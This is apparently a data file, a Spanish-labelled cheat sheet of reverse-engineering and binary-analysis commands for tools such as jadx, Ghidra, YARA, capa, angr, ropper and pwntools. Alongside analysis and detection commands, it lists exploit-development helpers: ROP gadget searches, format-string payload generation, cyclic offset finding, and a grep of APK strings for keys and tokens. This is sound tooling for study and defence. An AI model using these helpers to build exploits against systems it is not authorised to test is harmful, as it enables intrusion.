    "desc": "Solo sources"
   },
   {
    "cmd": "jadx -j 4 app.apk",
    "desc": "4 hilos"
   },
   {
    "cmd": "jadx --show-bad-code app.apk",
    "desc": "Mostrar código fallido"
   },
   {
    "cmd": "jadx -e app.apk",
    "desc": "Exportar como gradle"
   },
   {
    "cmd": "jadx -x 'com.example.*' app.apk",
    "desc": "Filtrar paquetes"
   },
   {
    "cmd": "jadx -i app.apk",
    "desc": "Sin resolución"
   },
   {
    "cmd": "jadx -v app.apk",
    "desc": "Verbose"
   },
   {
    "cmd": "jadx -q app.apk",
    "desc": "Quiet"
   },
   {
    "cmd": "jadx --no-imports app.apk",
    "desc": "Sin imports"
   },
   {
    "cmd": "jadx --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "dex2jar",
  "desc": "Convertir DEX a JAR",
  "commands": [
   {
    "cmd": "d2j-dex2jar app.apk",
    "desc": "Convertir"
   },
   {
    "cmd": "d2j-dex2jar classes.dex -o out.jar",
    "desc": "Salida"
   },
   {
    "cmd": "d2j-dex2jar app.apk -f",
    "desc": "Forzar"
   },
   {
    "cmd": "d2j-dex2jar app.apk -e",
    "desc": "Sin errors"
   },
   {
    "cmd": "d2j-dex2jar -v app.apk",
    "desc": "Verbose"
   },
   {
    "cmd": "d2j-dex2jar --skip-exception app.apk",
    "desc": "Sin exceptions"
   },
   {
    "cmd": "d2j-jar2dex app.jar -o out.dex",
    "desc": "JAR a DEX"
   },
   {
    "cmd": "d2j-dex-dump classes.dex",
    "desc": "Dump dex"
   },
   {
    "cmd": "d2j-apk-sign new.apk",
    "desc": "Firmar APK"
   },
   {
    "cmd": "d2j-dex2jar --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "smali",
  "desc": "Ensamblador/desensamblador de DEX (smali/baksmali)",
  "commands": [
   {
    "cmd": "baksmali classes.dex",
    "desc": "Desensamblar"
   },
   {
    "cmd": "baksmali classes.dex -o /tmp/smali",
    "desc": "Directorio"
   },
   {
    "cmd": "baksmali classes.dex -l 10",
    "desc": "Log level"
   },
   {
    "cmd": "baksmali classes.dex -x",
    "desc": "Debug"
   },
   {
    "cmd": "smali /tmp/smali -o classes.dex",
    "desc": "Ensamblar"
   },
   {
    "cmd": "smali /tmp/smali -o classes.dex -a 26",
    "desc": "API level"
   },
   {
    "cmd": "baksmali classes.dex --api 26",
    "desc": "API"
   },
   {
    "cmd": "baksmali -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "edb",
  "desc": "Evan's Debugger (GUI debugger Linux)",
  "commands": [
   {
    "cmd": "edb binario",
    "desc": "Abrir"
   },
   {
    "cmd": "edb --run binario",
    "desc": "Ejecutar"
   },
   {
    "cmd": "edb --attach PID",
    "desc": "Adjuntar"
   },
   {
    "cmd": "edb --breakpoint 0x401000 binario",
    "desc": "Breakpoint"
   },
   {
    "cmd": "edb --data-dir /tmp/edb",
    "desc": "Data dir"
   },
   {
    "cmd": "edb --no-gui binario",
    "desc": "Sin GUI"
   },
   {
    "cmd": "edb --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "nasm",
  "desc": "Ensamblador NASM",
  "commands": [
   {
    "cmd": "nasm -f elf32 shell.asm -o shell.o",
    "desc": "ELF32"
   },
   {
    "cmd": "nasm -f elf64 shell.asm -o shell.o",
    "desc": "ELF64"
   },
   {
    "cmd": "nasm -f bin shell.asm -o shell.bin",
    "desc": "Raw bin"
   },
   {
    "cmd": "nasm -f win32 shell.asm -o shell.obj",
    "desc": "Windows"
   },
   {
    "cmd": "nasm -g -f elf64 shell.asm",
    "desc": "Con debug"
   },
   {
    "cmd": "nasm -l list.txt -f elf64 shell.asm",
    "desc": "Listado"
   },
   {
    "cmd": "nasm -o out.bin -f bin -i include/ shell.asm",
    "desc": "Include dir"
   },
   {
    "cmd": "nasm -v",
    "desc": "Versión"
   },
   {
    "cmd": "nasm -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ndisasm",
  "desc": "Desensamblador de NASM (raw bytes)",
  "commands": [
   {
    "cmd": "ndisasm shell.bin",
    "desc": "Desensamblar"
   },
   {
    "cmd": "ndisasm -b 64 shell.bin",
    "desc": "64-bit"
   },
   {
    "cmd": "ndisasm -b 32 shell.bin",
    "desc": "32-bit"
   },
   {
    "cmd": "ndisasm -o 0x1000 shell.bin",
    "desc": "Offset base"
   },
   {
    "cmd": "ndisasm -e 512 shell.bin",
    "desc": "Saltar bytes"
   },
   {
    "cmd": "ndisasm -s 0x200 shell.bin",
    "desc": "Empezar en offset"
   },
   {
    "cmd": "ndisasm -n 10 shell.bin",
    "desc": "10 instrucciones"
   },
   {
    "cmd": "ndisasm -u shell.bin",
    "desc": "Upper"
   },
   {
    "cmd": "ndisasm -p intel shell.bin",
    "desc": "Sintaxis"
   },
   {
    "cmd": "ndisasm -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "objcopy",
  "desc": "Copiar/convertir objetos binarios (extract secciones)",
  "commands": [
   {
    "cmd": "objcopy --dump-section .text=text.bin binario",
    "desc": "Extraer sección"
   },
   {
    "cmd": "objcopy --only-section=.data -O binary binario data.bin",
    "desc": "Solo .data"
   },
   {
    "cmd": "objcopy --strip-all binario stripped",
    "desc": "Stripped"
   },
   {
    "cmd": "objcopy --strip-debug binario stripped",
    "desc": "Sin debug"
   },
   {
    "cmd": "objcopy -O binary --only-section=.rodata binario rodata.bin",
    "desc": "rodata"
   },
   {
    "cmd": "objcopy -O elf64-x86-64 in.o out.o",
    "desc": "Cambiar formato"
   },
   {
    "cmd": "objcopy --add-section .mysec=file binario",
    "desc": "Añadir sección"
   },
   {
    "cmd": "objcopy --remove-section .comment binario",
    "desc": "Quitar sección"
   },
   {
    "cmd": "objcopy --only-keep-debug binario binario.debug",
    "desc": "Solo debug"
   },
   {
    "cmd": "objcopy --redefine-sym old=new binario",
    "desc": "Renombrar símbolo"
   },
   {
    "cmd": "objcopy --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "eu-readelf",
  "desc": "Readelf de elfutils (eu-readelf)",
  "commands": [
   {
    "cmd": "eu-readelf -h binario",
    "desc": "Header"
   },
   {
    "cmd": "eu-readelf -S binario",
    "desc": "Secciones"
   },
   {
    "cmd": "eu-readelf -s binario",
    "desc": "Símbolos"
   },
   {
    "cmd": "eu-readelf -l binario",
    "desc": "Segmentos"
   },
   {
    "cmd": "eu-readelf -d binario",
    "desc": "Dynamic"
   },
   {
    "cmd": "eu-readelf -r binario",
    "desc": "Relocations"
   },
   {
    "cmd": "eu-readelf -a binario",
    "desc": "Todo"
   },
   {
    "cmd": "eu-readelf -n binario",
    "desc": "Notas"
   },
   {
    "cmd": "eu-readelf -x .text binario",
    "desc": "Hex sección"
   },
   {
    "cmd": "eu-readelf -p .rodata binario",
    "desc": "Strings sección"
   },
   {
    "cmd": "eu-readelf --debug-dump binario",
    "desc": "Debug info"
   },
   {
    "cmd": "eu-readelf -W binario",
    "desc": "Wide"
   },
   {
    "cmd": "eu-readelf -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dwarfdump",
  "desc": "Leer información DWARF de debug",
  "commands": [
   {
    "cmd": "dwarfdump binario",
    "desc": "Todo"
   },
   {
    "cmd": "dwarfdump --debug-info binario",
    "desc": "Debug info"
   },
   {
    "cmd": "dwarfdump --debug-line binario",
    "desc": "Line info"
   },
   {
    "cmd": "dwarfdump --debug-abbrev binario",
    "desc": "Abbrev"
   },
   {
    "cmd": "dwarfdump --debug-aranges binario",
    "desc": "Aranges"
   },
   {
    "cmd": "dwarfdump --debug-str binario",
    "desc": "Strings"
   },
   {
    "cmd": "dwarfdump --debug-ranges binario",
    "desc": "Ranges"
   },
   {
    "cmd": "dwarfdump --debug-frame binario",
    "desc": "Frame"
   },
   {
    "cmd": "dwarfdump --lookup 0x401000 binario",
    "desc": "Lookup"
   },
   {
    "cmd": "dwarfdump --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "checksec",
  "desc": "Comprobar protecciones de binarios",
  "commands": [
   {
    "cmd": "checksec --file=/bin/ls",
    "desc": "Chequear"
   },
   {
    "cmd": "checksec --file=binary --output=json",
    "desc": "JSON"
   },
   {
    "cmd": "checksec --file=binary --output=text",
    "desc": "Texto"
   },
   {
    "cmd": "checksec --file=binary --output=csv",
    "desc": "CSV"
   },
   {
    "cmd": "checksec --file=binary --debug",
    "desc": "Debug"
   },
   {
    "cmd": "checksec --update",
    "desc": "Actualizar"
   },
   {
    "cmd": "checksec --fortify-file=binary",
    "desc": "Fortify"
   },
   {
    "cmd": "checksec --all",
    "desc": "Todos"
   },
   {
    "cmd": "readelf -l binary | grep GNU_STACK",
    "desc": "Stack exec"
   },
   {
    "cmd": "readelf -l binary | grep GNU_RELRO",
    "desc": "RELRO"
   },
   {
    "cmd": "readelf -s binary | grep __stack_chk_fail",
    "desc": "Canary"
   },
   {
    "cmd": "readelf -h binary | grep Type",
    "desc": "Tipo"
   },
   {
    "cmd": "objdump -d binary | grep -c 'int3'",
    "desc": "Contar int3"
   },
   {
    "cmd": "hardening-check /bin/ls",
    "desc": "Hardening-check"
   },
   {
    "cmd": "checksec --file=binary --output=json | python3 -m json.tool",
    "desc": "Pretty JSON"
   }
  ]
 },
 {
  "tool": "ropper-extra",
  "desc": "Búsqueda de gadgets ROP",
  "commands": [
   {
    "cmd": "ropper --file binary --search 'pop rdi'",
    "desc": "Buscar gadget"
   },
   {
    "cmd": "ropper --file binary --search 'syscall'",
    "desc": "Syscall"
   },
   {
    "cmd": "ropper --file binary --search 'ret'",
    "desc": "Ret"
   },
   {
    "cmd": "ropper --file binary --nop",
    "desc": "Nops"
   },
   {
    "cmd": "ropper --file binary --all",
    "desc": "Todos"
   },
   {
    "cmd": "ropper --file binary --search 'jmp rsp'",
    "desc": "Jmp rsp"
   },
   {
    "cmd": "ropper --file binary --search 'mov rax'",
    "desc": "Mov rax"
   },
   {
    "cmd": "ropper --file binary --search 'int 0x80'",
    "desc": "Int 80"
   },
   {
    "cmd": "ropper --file binary --search 'pop rax; ret'",
    "desc": "Pop rax ret"
   },
   {
    "cmd": "ropper --file binary --search 'leave; ret'",
    "desc": "Leave ret"
   },
   {
    "cmd": "ropper --file binary --search 'xor'",
    "desc": "Xor"
   },
   {
    "cmd": "ropper --file binary --search 'add rsp'",
    "desc": "Add rsp"
   },
   {
    "cmd": "ropper --file binary --search 'xchg'",
    "desc": "Xchg"
   },
   {
    "cmd": "ropper --file binary --search 'push rax'",
    "desc": "Push rax"
   },
   {
    "cmd": "ropper --file binary --search 'mov [rdi]'",
    "desc": "Mov mem"
   },
   {
    "cmd": "ropper --file binary --search 'pop rdx'",
    "desc": "Pop rdx"
   },
   {
    "cmd": "ropper --file binary --search 'pop rsi'",
    "desc": "Pop rsi"
   },
   {
    "cmd": "ropper --file binary --search 'pop rbp'",
    "desc": "Pop rbp"
   }
  ]
 },
 {
  "tool": "pwntools-extra",
  "desc": "Pwntools (exploit dev)",
  "commands": [
   {
    "cmd": "python3 -c 'from pwn import *; print(cyclic(100))'",
    "desc": "Cyclic"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(cyclic_find(b\"aaa\").hex())'",
    "desc": "Offset"
   },
   {
    "cmd": "python3 -c 'from pwn import *; e=ELF(\"./binary\"); print(hex(e.symbols[\"win\"]))'",
    "desc": "Símbolos"
   },
   {
    "cmd": "python3 -c 'from pwn import *; e=ELF(\"./binary\"); print(e.got)'",
    "desc": "GOT"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(asm(\"mov rax, 60\"))'",
    "desc": "Ensamblar"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(disasm(b\"\\x48\\x31\\xc0\"))'",
    "desc": "Desensamblar"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(ROP(ELF(\"./binary\")).dump())'",
    "desc": "ROP dump"
   },
   {
    "cmd": "python3 -c 'from pwn import *; r=remote(\"IP\",1337); r.sendline(b\"x\"); print(r.recv())'",
    "desc": "Remote"
   },
   {
    "cmd": "python3 -c 'from pwn import *; r=process(\"./binary\"); r.interactive()'",
    "desc": "Local"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(p64(0xdeadbeef))'",
    "desc": "P64"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(unpack(b\"\\xef\\xbe\\xad\\xde\"))'",
    "desc": "Unpack"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(bits(\"amd64\"))'",
    "desc": "Bits"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(context.arch)'",
    "desc": "Arch"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(checksec(\"./binary\"))'",
    "desc": "Checksec py"
   },
   {
    "cmd": "python3 -c 'from pwn import *; print(fmtstr_payload(offset, {got[\"puts\"]: addr}))'",
    "desc": "Format string"
   }
  ]
 },
 {
  "tool": "dex2jar",
  "desc": "Análisis de APKs (dex2jar, jadx)",
  "commands": [
   {
    "cmd": "d2j-dex2jar.sh app.apk -o app.jar",
    "desc": "Dex a jar"
   },
   {
    "cmd": "d2j-dex2jar.sh -f app.apk",
    "desc": "Forzar"
   },
   {
    "cmd": "jadx app.apk",
    "desc": "Descompilar"
   },
   {
    "cmd": "jadx -d /tmp/out app.apk",
    "desc": "A directorio"
   },
   {
    "cmd": "jadx --no-res app.apk",
    "desc": "Sin recursos"
   },
   {
    "cmd": "jadx -j 4 app.apk",
    "desc": "Hilos"
   },
   {
    "cmd": "unzip -l app.apk | head",
    "desc": "Ver apk"
   },
   {
    "cmd": "apktool d app.apk",
    "desc": "Apktool decode"
   },
   {
    "cmd": "apktool d -f -o /tmp/out app.apk",
    "desc": "Force"
   },
   {
    "cmd": "apktool b /tmp/out -o new.apk",
    "desc": "Reconstruir"
   },
   {
    "cmd": "strings classes.dex | grep -i 'api\\\\|key\\\\|token'",
    "desc": "Strings"
   },
   {
    "cmd": "d2j-asm-verify.sh app.jar",
    "desc": "Verificar"
   },
   {
    "cmd": "dexdump classes.dex | head",
    "desc": "Dexdump"
   },
   {
    "cmd": "jadx --deobf app.apk",
    "desc": "Deobfuscate"
   },
   {
    "cmd": "aapt dump badging app.apk",
    "desc": "Badging"
   },
   {
    "cmd": "aapt dump permissions app.apk",
    "desc": "Permisos"
   },
   {
    "cmd": "keytool -printcert -jarfile app.apk",
    "desc": "Cert"
   },
   {
    "cmd": "apksigner verify app.apk",
    "desc": "Verificar firma"
   }
  ]
 },
 {
  "tool": "ghidra-extra",
  "desc": "Ghidra (variantes de análisis)",
  "commands": [
   {
    "cmd": "ghidra -analyzeHeadless /tmp/proj out -import binary",
    "desc": "Headless"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -import binary -postScript AnalyzeHeadless.java",
    "desc": "Con script"
   },
   {
    "cmd": "ghidra -scriptPath /tmp/scripts",
    "desc": "Scripts"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -process binary -analysisTimeout 300",
    "desc": "Timeout"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -import dir -recursive",
    "desc": "Import dir"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -process binary -export -format asm",
    "desc": "Export asm"
   },
   {
    "cmd": "ghidra -recursive",
    "desc": "Recursive"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -process binary -deleteProject",
    "desc": "Borrar"
   },
   {
    "cmd": "ghidra -script /tmp/x.py",
    "desc": "Script"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -process binary -noanalysis",
    "desc": "Sin análisis"
   },
   {
    "cmd": "analyzeHeadless /tmp/proj out -process binary -scriptlog /tmp/log",
    "desc": "Log"
   },
   {
    "cmd": "ghidra --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "yara-malware",
  "desc": "YARA (reglas de detección de malware)",
  "commands": [
   {
    "cmd": "yara /usr/share/yara-rules/rules.yar sample.bin",
    "desc": "Escanear"
   },
   {
    "cmd": "yara -r rules.yar /dir/",
    "desc": "Recursivo"
   },
   {
    "cmd": "yara -m rules.yar sample",
    "desc": "Meta"
   },
   {
    "cmd": "yara -s rules.yar sample",
    "desc": "Strings"
   },
   {
    "cmd": "yara -c rules.yar sample",
    "desc": "Contar"
   },
   {
    "cmd": "yara -f rules.yar sample",
    "desc": "Fast"
   },
   {
    "cmd": "yara -w rules.yar sample",
    "desc": "Sin warnings"
   },
   {
    "cmd": "yara -z rules.yar sample",
    "desc": "Sin mensajes"
   },
   {
    "cmd": "yara -e rules.yar sample",
    "desc": "No guardar"
   },
   {
    "cmd": "yara -g rules.yar sample",
    "desc": "Prints"
   },
   {
    "cmd": "yara --scan-list list.txt rules.yar",
    "desc": "De lista"
   },
   {
    "cmd": "yara --print-meta rules.yar sample",
    "desc": "Meta"
   },
   {
    "cmd": "yara --print-strings rules.yar sample",
    "desc": "Strings"
   },
   {
    "cmd": "yara --print-namespace rules.yar sample",
    "desc": "Namespace"
   },
   {
    "cmd": "yara --fail-on-warnings rules.yar sample",
    "desc": "Fail on warn"
   },
   {
    "cmd": "yara -d rule=1 rules.yar sample",
    "desc": "Definir"
   },
   {
    "cmd": "yara -x var=val rules.yar sample",
    "desc": "Externo"
   },
   {
    "cmd": "yara --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "capa",
  "desc": "Identificar capacidades de binarios (FLARE)",
  "commands": [
   {
    "cmd": "capa sample.exe",
    "desc": "Analizar"
   },
   {
    "cmd": "capa sample.bin -f bin",
    "desc": "Formato bin"
   },
   {
    "cmd": "capa -v sample.exe",
    "desc": "Verbose"
   },
   {
    "cmd": "capa -j sample.exe",
    "desc": "JSON"
   },
   {
    "cmd": "capa -s sample.exe",
    "desc": "Strings"
   },
   {
    "cmd": "capa -r rules/ sample.exe",
    "desc": "Reglas custom"
   },
   {
    "cmd": "capa --format sc32 sample.exe",
    "desc": "Shellcode"
   },
   {
    "cmd": "capa --format sc64 sample.exe",
    "desc": "SC64"
   },
   {
    "cmd": "capa -q sample.exe",
    "desc": "Quiet"
   },
   {
    "cmd": "capa -o /tmp/out.json sample.exe",
    "desc": "Salida"
   },
   {
    "cmd": "capa -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "python3 -c 'import capa.main'",
    "desc": "Import"
   }
  ]
 },
 {
  "tool": "floss",
  "desc": "Extraer strings y decodificar (FLARE)",
  "commands": [
   {
    "cmd": "floss sample.exe",
    "desc": "Strings"
   },
   {
    "cmd": "floss --format sc32 sample.exe",
    "desc": "Shellcode"
   },
   {
    "cmd": "floss --no-static-strings sample.exe",
    "desc": "Sin estáticas"
   },
   {
    "cmd": "floss -n 8 sample.exe",
    "desc": "Min length"
   },
   {
    "cmd": "floss -j sample.exe -o out.json",
    "desc": "JSON"
   },
   {
    "cmd": "floss -q sample.exe",
    "desc": "Quiet"
   },
   {
    "cmd": "floss -v sample.exe",
    "desc": "Verbose"
   },
   {
    "cmd": "floss --only-decoded sample.exe",
    "desc": "Solo decoded"
   },
   {
    "cmd": "floss --functions main sample.exe",
    "desc": "Funciones"
   },
   {
    "cmd": "floss -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "floss -f bin sample.bin",
    "desc": "Binario raw"
   }
  ]
 },
 {
  "tool": "binary-diff",
  "desc": "Comparación de binarios (diffing)",
  "commands": [
   {
    "cmd": "radiff2 a.exe b.exe",
    "desc": "Radiff"
   },
   {
    "cmd": "radiff2 -s a.exe b.exe",
    "desc": "Similaridad"
   },
   {
    "cmd": "radiff2 -C a.exe b.exe",
    "desc": "Colores"
   },
   {
    "cmd": "radiff2 -g main a.exe b.exe",
    "desc": "Función"
   },
   {
    "cmd": "bindiff a.exe b.exe",
    "desc": "BinDiff"
   },
   {
    "cmd": "radiff2 -a x86 -b 32 a.exe b.exe",
    "desc": "Arch"
   },
   {
    "cmd": "cmp -l a.exe b.exe | head",
    "desc": "Byte diff"
   },
   {
    "cmd": "diff <(objdump -d a.exe) <(objdump -d b.exe) | head",
    "desc": "Disas diff"
   },
   {
    "cmd": "python3 -c 'a=open(\"a.exe\",\"rb\").read(); b=open(\"b.exe\",\"rb\").read(); print(sum(x!=y for x,y in zip(a,b)))'",
    "desc": "Py diff"
   },
   {
    "cmd": "radiff2 -A a.exe b.exe | head -40",
    "desc": "Análisis"
   },
   {
    "cmd": "grep -a -c 'password' a.exe b.exe",
    "desc": "Grep count"
   },
   {
    "cmd": "strings a.exe | sort > a.s; strings b.exe | sort > b.s; comm -13 a.s b.s | head",
    "desc": "Strings diff"
   },
   {
    "cmd": "radiff2 -R a.exe b.exe",
    "desc": "Rename"
   }
  ]
 },
 {
  "tool": "angr-tools",
  "desc": "Análisis simbólico con angr",
  "commands": [
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\", auto_load_libs=False); print(p)'",
    "desc": "Cargar"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); s=p.factory.entry_state(); sm=p.factory.simulation_manager(s); sm.explore(find=0x401234); print(sm.found[0].posix.dumps(0))'",
    "desc": "Find state"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); s=p.factory.entry_state(); print(s.solver.eval(s.regs.rax))'",
    "desc": "Eval rax"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); s=p.factory.entry_state(); sm=p.factory.simulation_manager(s); print(sm.step().active)'",
    "desc": "Step"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); print(p.loader.main_object.symbols.keys())'",
    "desc": "Symbols"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); print(p.loader.main_object.sections)'",
    "desc": "Sections"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); print(p.analyses.CFGFast())'",
    "desc": "CFG"
   },
   {
    "cmd": "python3 -c 'import angr; p=angr.Project(\"./binary\"); print([x for x in p.hook_by_addr.keys()])'",
    "desc": "Hooks"
   }
  ]
 }
];
